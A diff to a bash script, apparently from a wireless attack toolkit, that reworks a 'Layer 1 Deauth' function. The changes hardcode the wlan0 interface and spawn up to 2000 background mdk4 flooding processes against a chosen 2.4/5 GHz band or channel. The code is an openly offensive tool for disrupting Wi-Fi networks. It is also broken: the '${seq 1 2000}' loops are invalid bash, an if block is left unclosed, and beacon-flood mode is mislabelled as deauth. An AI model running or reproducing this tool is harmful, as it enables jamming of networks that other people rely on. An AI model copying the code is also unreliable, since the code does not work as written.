@@ -438,15 +438,14 @@ EAPOL_Capture_Deauth () {
 
 For_Layer1_Deauth () {
     echo "you chose Layer 1 Deauth"
-    read -p "Enter interface (monitor mode) you wish to use for the attack: " interface
     while true; do
         read -p "frequencey band(1), channel(2), Return(3) or exit(anything else) you wish to use: " OP
         if [ $OP == 1 ]; then
             read -p "Enter frequencey band you wish to use (2.4 or 5): " band
             if [ $band == 2.4 ]; then
-                band_op="2.4GHz"
+                band_op="2.4G"
             elif [ $band == 5 ]; then
-                band_op="5GHz"
+                band_op="5G"
             else
                 echo "exitting"
                 exit 1
@@ -457,7 +456,7 @@ For_Layer1_Deauth () {
                 echo "invalid input, returning"
                 break
             else
-                sudo iwconfig $interface channel $channel
+                sudo iwconfig wlan0 channel $channel
             fi
         elif [ $OP == 3 ]; then
             echo "returning"
@@ -472,19 +471,39 @@ For_Layer1_Deauth () {
             break
         else
             echo "continuing"
-            for count in $(seq 1 2000)
+        fi
+        echo "starting attack"
+        echo "cancel the attack early with ctrl c"
+        if [ $OP == 1 ]; then   
+            
+            if [ $band_op == "5G" ]; then
+                echo "starting mdk4 Layer 1 Deauth on 5G"
+                echo "cancel the attack early with ctrl c"
+                for count in ${seq 1 2000}; 
+                do
+                    (mdk4 wlan0 b -h 5 > /dev/null)&
+                done
+        
+            elif [ $band_op == "2.4G" ]; then
+                echo "starting mdk4 Layer 1 Deauth on 2.4G"
+                echo "cancel the attack early with ctrl c"
+                for count in ${seq 1 2000}; 
+                do
+                    (mdk4 wlan0 b -h 2.4 > /dev/null)&
+                done
+            else
+                echo "error, returning"
+                break
+        elif [ $OP == 2 ]; then
+            echo "starting mdk4 Layer 1 Deauth on channel $channel"
+            echo "cancel the attack early with ctrl c"
+            for count in ${seq 1 2000}; 
             do
-                if [ $OP == 2 ]; then
-                    echo "to cancel the attack, press ctrl c"
-                    (iwconfig $interface b -c $channel > /dev/null)&
-                elif [ $OP == 1 ]; then
-                    echo "to cancel the attack, press ctrl c"
-                    (iwconfig $interface b -b $band_op > /dev/null)&
-                else
-                    echo "invalid input22 returning"
-                    break
-                fi
+                (mdk4 wlan0 b -c $channel > /dev/null)&
             done
+        else 
+            echo "error, returning"
+            break
         fi
     done
 }
